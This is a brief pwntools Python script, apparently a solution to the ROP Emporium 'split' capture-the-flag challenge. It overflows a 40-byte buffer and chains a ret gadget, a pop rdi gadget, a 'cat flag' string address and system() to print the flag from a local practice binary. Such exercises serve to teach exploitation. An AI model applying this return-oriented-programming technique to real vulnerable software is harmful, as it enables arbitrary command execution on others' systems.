from pwn import *;

elf = context.binary = ELF("./split")

padding = b'A'*40
ret = p64(0x40053e)          
pop_rdi = p64(0x4007c3)      
cat_flag = p64(0x601060)     
system = p64(0x400560)

payload = padding + ret + pop_rdi + cat_flag + system

io = process("./split")
io.sendlineafter(b"> ", payload)

print(io.recvall().decode(errors="ignore")) 